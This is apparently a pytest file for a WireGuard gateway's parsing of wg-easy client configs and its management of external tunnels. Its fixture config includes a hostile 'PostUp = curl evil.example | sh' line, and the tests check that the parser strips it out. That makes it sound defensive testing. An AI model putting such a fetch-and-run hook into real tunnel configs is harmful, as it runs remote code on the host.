import subprocess
import time
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from deployra_common import wg
from deployra_gateway.app import create_api_app, create_bootstrap_app
from deployra_gateway.state import State
from deployra_gateway.wg_external import ExternalTunnels, default_routes, parse_client_conf
from deployra_gateway.wg_hub import Hub
from test_gateway_api import _pair, _signed

PRIV, _ = wg.genkey()
_, SERVER = wg.genkey()
PSK = wg.genpsk()
# tak wygląda plik klienta z wg-easy
WG_EASY = f"""[Interface]
PrivateKey = {PRIV}
Address = 10.8.0.4/24
DNS = 1.1.1.1
MTU = 1420
PostUp = curl evil.example | sh

[Peer]
PublicKey = {SERVER}
PresharedKey = {PSK}
AllowedIPs = 0.0.0.0/0, ::/0
PersistentKeepalive = 0
Endpoint = cezary.example.com:30178
"""


def test_parse_wg_easy_conf():
    parsed = parse_client_conf(WG_EASY)
    assert parsed["addresses"] == ["10.8.0.4/24"] and parsed["mtu"] == 1420
    assert parsed["peer"]["endpoint"] == "cezary.example.com:30178" and parsed["peer"]["keepalive"] == 25
    assert parsed["ignored"] == ["dns", "postup"]
    assert default_routes(parsed) == ["10.8.0.0/24"]  # bez 0.0.0.0/0 — inaczej cały ruch bramki szedłby tunelem
    for broken in ("[Interface]\nAddress = 10.8.0.4/24\n", WG_EASY.replace("Endpoint", "# Endpoint"), WG_EASY + "\n[Peer]\nPublicKey = x\n"):
        with pytest.raises(ValueError):
            parse_client_conf(broken)


class Runner:
    def __init__(self):
        self.calls, self.up = [], set()

    def __call__(self, args, **_):
        self.calls.append(args)
        out, code = "", 0
        if args[:2] == ["wg", "show"]:
            code = 0 if args[2] in self.up else 1
            if len(args) == 4 and args[2] in self.up:
                out = f"priv\tpub\t51820\toff\n{SERVER}\t(none)\t1.2.3.4:30178\t10.8.0.0/24\t{int(time.time()) - 5}\t1000\t2000\t25\n"
        elif args[0] == "wg-quick" and args[1] == "up":
            self.up.add(Path(args[2]).stem)
        return subprocess.CompletedProcess(args, code, out, "")


@pytest.fixture
def tunnels(tmp_path, monkeypatch):
    monkeypatch.setattr(wg.WgControl, "tools_available", staticmethod(lambda: True))
    runner = Runner()
    config = SimpleNamespace(wg_enabled=True, wg_iface="wg0", wg_subnet="10.66.0.0/24")
    state = State(tmp_path / "state.json")
    ext = ExternalTunnels(config, state, lambda name: wg.WgControl(name, conf_dir=str(tmp_path / "wg"), runner=runner))
    return SimpleNamespace(ext=ext, runner=runner, state=state, config=config, dir=tmp_path / "wg")


def test_put_brings_tunnel_up_with_own_routes(tunnels):
    entry = tunnels.ext.put("wg1", WG_EASY)
    assert entry["routes"] == ["10.8.0.0/24"] and entry["error"] is None
    conf = (tunnels.dir / "wg1.conf").read_text(encoding="utf-8")
    assert "Table = off" in conf and "AllowedIPs = 10.8.0.0/24" in conf and "PersistentKeepalive = 25" in conf
    assert "DNS" not in conf and "PostUp" not in conf and "0.0.0.0/0" not in conf
    assert ["ip", "route", "replace", "10.8.0.0/24", "dev", "wg1"] in tunnels.runner.calls

    [status] = tunnels.ext.status()
    assert status["up"] and status["online"] and status["live_endpoint"] == "1.2.3.4:30178" and status["rx_bytes"] == 1000
    assert PRIV not in str(status) and PSK not in str(status) and status["public_key"] == wg.pubkey(PRIV)

    # po restarcie bramki tunel wstaje z zapisanego stanu
    tunnels.runner.up.clear()
    fresh = ExternalTunnels(tunnels.config, State(tunnels.state.path), tunnels.ext.control_factory)
    fresh.up_all()
    assert "wg1" in tunnels.runner.up

    tunnels.ext.remove("wg1")
    assert tunnels.ext.status() == [] and not (tunnels.dir / "wg1.conf").exists()


def test_put_rejects_dangerous_or_conflicting_routes(tunnels):
    with pytest.raises(ValueError):
        tunnels.ext.put("wg0", WG_EASY)  # interfejs huba
    with pytest.raises(ValueError):
        tunnels.ext.put("eth0", WG_EASY)
    with pytest.raises(ValueError, match="0.0.0.0/0"):
        tunnels.ext.put("wg1", WG_EASY, routes=["0.0.0.0/0"])
    with pytest.raises(ValueError):
        tunnels.ext.put("wg1", WG_EASY, routes=["10.66.0.0/16"])  # podsieć tunelu Deployry

    # martwy peer z tą samą podsiecią (np. „cezary” z 10.8.0.0/24) blokuje — inaczej trasy by się gryzły
    _, key = wg.genkey()
    tunnels.state.update(peers={"n1": {"kind": "node", "name": "cezary", "public_key": key, "address": "10.66.0.2",
                                       "lan_subnets": ["10.8.0.0/24"], "created": 1}})  # fmt: skip
    with pytest.raises(ValueError, match="cezary"):
        tunnels.ext.put("wg1", WG_EASY)
    tunnels.state.update(peers={})
    tunnels.ext.put("wg1", WG_EASY, routes=["10.8.0.0/24", "192.168.5.0/24"])
    hub = Hub(SimpleNamespace(**vars(tunnels.config), wg_port=51820, hub_address="10.66.0.1", hub_endpoint="x:1",
                              api_url="http://10.66.0.1:2751"), tunnels.state, wg.WgControl("wg0", runner=tunnels.runner))  # fmt: skip
    with pytest.raises(ValueError, match="wg1"):
        hub.add_peer("n2", "node", "dom", key, ["192.168.5.0/24"])


def test_api_external_tunnels(ctx):
    boot = TestClient(create_bootstrap_app(ctx))
    api = TestClient(create_api_app(ctx, start_scheduler=False))
    secret, _ = _pair(boot, ctx)
    response = _signed(api, secret, "PUT", "/api/external-wg/wg1", {"config": WG_EASY})
    assert response.status_code == 200, response.text
    assert response.json()["routes"] == ["10.8.0.0/24"] and response.json()["ignored"] == ["dns", "postup"]
    assert _signed(api, secret, "PUT", "/api/external-wg/wg1", {"config": "[Interface]\nfoo = bar\n" + "x" * 20}).status_code == 400
    tunnels = _signed(api, secret, "GET", "/api/status").json()["external"]
    assert [t["name"] for t in tunnels] == ["wg1"] and tunnels[0]["up"] is False  # w testach WireGuard wyłączony
    assert _signed(api, secret, "DELETE", "/api/external-wg/wg1").json() == {"ok": True}
    assert _signed(api, secret, "DELETE", "/api/external-wg/wg1").status_code == 404
